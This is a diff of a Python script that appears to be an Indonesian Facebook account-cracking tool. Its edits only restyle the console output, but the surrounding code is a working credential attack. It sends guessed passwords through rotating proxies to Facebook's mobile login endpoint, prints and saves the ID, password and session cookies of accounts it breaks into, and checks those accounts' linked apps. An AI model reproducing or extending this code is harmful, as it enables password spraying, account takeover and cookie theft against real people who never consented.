@@ -634,7 +634,7 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print('├──> PILIH YANG BENAR ')
+		print('└──[PILIH YANG BENAR ')
 		exit()
 	print(f'└──[1] MOBILE FACEBOOK {sir}[RECOMENDED]{x} ')
 	print(f'└──[2] MBASIC FACEBOOK {k}[NOT RECOMENDED]{x} ')
@@ -653,7 +653,7 @@ def setting():
 	else:
 		method.append('mobile')
 	print('───────────────────────────────────────────────────')
-	_ilman_ = input('└──INGIN MENAMPILKAN APLIKASI TERKAIT [ Y/T ] : ')
+	_ilman_ = input('└──[INGIN MENAMPILKAN APLIKASI TERKAIT [ Y/T ] : ')
 	if _ilman_ in ['']:
 		print('└──PILIH YANG BENAR ')
 		back()
@@ -661,7 +661,7 @@ def setting():
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('└──INGIN MENAMBAHKAN PASSWORD MANUAL [ Y/T ] : ')
+	pwplus=input('└──[INGIN MENAMBAHKAN PASSWORD MANUAL [ Y/T ] : ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] MASUKAN KATA SANDI TAMBAHAN\n[[cyan]•[white]] CONTOH :[green] SAYANG,BISMILLAH,INDONESIA[white] '))
@@ -723,7 +723,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r└──[ILMAN] 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
+	sys.stdout.write(f"\r└──{sir}[ILMAN]{x} 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
 	sys.stdout.flush()
 	nip=random.choice(prox)
 	proxs= {'http': 'socks4://'+nip}
@@ -763,7 +763,7 @@ def crack(idf,pwv):
 def crackfree(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r└──[ILMAN] 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
+	sys.stdout.write(f"\r└──{sir}[ILMAN]{x} 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
 	sys.stdout.flush()
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
@@ -778,7 +778,7 @@ def crackfree(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r├── ID  : {K}{idf}{P}          \n│   └──  SANDI  : {K}{pw}          {P}\n└── UA  : {M}{ua}{M}           \n')
+				print(f'\r└──ID  : {K}{idf}{P}          \n│   └──  SANDI  : {K}{pw}          {P}\n└── UA  : {M}{ua}{M}           \n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -787,7 +787,7 @@ def crackfree(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  SANDI  : {H}{pw}          {P}\n└── COOKIES : {hh}{kuki}          {P}\n└── UGENT  : {M}{ua}{M}\n')
+				print(f'\r└──ID  : {H}{idf}{P}          \n│   └──  SANDI  : {H}{pw}          {P}\n└── COOKIES : {hh}{kuki}          {P}\n└── UGENT  : {M}{ua}{M}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
 				break
@@ -811,7 +811,7 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	ilman(f'\n\t{x}{h} └── ILMAN RAMDHANI RAHMAN :> {x}')
+	ilman(f'\n\t{x}{sir} └── ILMAN RAMDHANI RAHMAN :> {x}')
 	time.sleep(3)
 	login()
 #IlmanRamdhaniRahman
